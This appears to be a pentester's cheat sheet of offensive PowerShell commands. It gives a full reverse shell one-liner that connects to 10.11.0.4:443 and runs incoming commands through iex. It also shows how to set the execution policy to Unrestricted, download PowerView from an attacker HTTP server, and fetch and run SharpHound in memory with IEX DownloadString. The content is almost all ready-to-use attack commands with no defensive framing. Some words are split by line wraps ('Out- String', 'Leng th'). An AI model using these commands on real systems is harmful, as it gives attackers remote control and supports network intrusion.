## Powershell reverse shell one liner

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out- String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush();}$client.Close()"
```
#### Powershell

Set execution policy

`Set-ExecutionPolicy Unrestricted -Scope CurrentUser`

`(new-object System.Net.WebClient).DownloadFile('http://192.168.119.175:8000/powerview.ps1','C:\Users\offsec\Desktop\powerview.ps1')`

`IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.123/ps/SharpHound.ps1')`
